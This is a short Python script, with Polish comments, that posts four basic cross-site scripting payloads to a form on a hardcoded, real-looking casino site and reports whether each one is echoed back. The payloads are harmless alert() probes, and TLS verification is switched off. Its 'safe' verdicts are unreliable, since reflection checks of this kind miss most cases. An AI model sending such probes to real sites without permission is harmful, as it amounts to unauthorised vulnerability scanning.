import requests

def test_xss_vulnerability(url, payload, form_field="input"):
    try:
        response = requests.post(url, data={form_field: payload}, timeout=10, verify=False)
        if payload in response.text:
            print(f"Strona może być podatna na atak XSS przy użyciu payloadu: {payload}")
        else:
            print(f"Strona jest bezpieczna przed atakami XSS dla payloadu: {payload}")
    except requests.RequestException as e:
        print(f"Błąd podczas łączenia z {url}: {e}")

# Przykładowe payloady
payloads = [
    "<script>alert('XSS!')</script>",
    "javascript:alert('XSS!')",
    "<img src=\"javascript:alert('XSS!')\">",
    "\";alert('XSS!');//"
]

# Przykładowe użycie
url = "https://pkcasino.zscz-l.pl/index.php"  # Zmień na adres strony, którą chcesz przetestować

for payload in payloads:
    test_xss_vulnerability(url, payload)
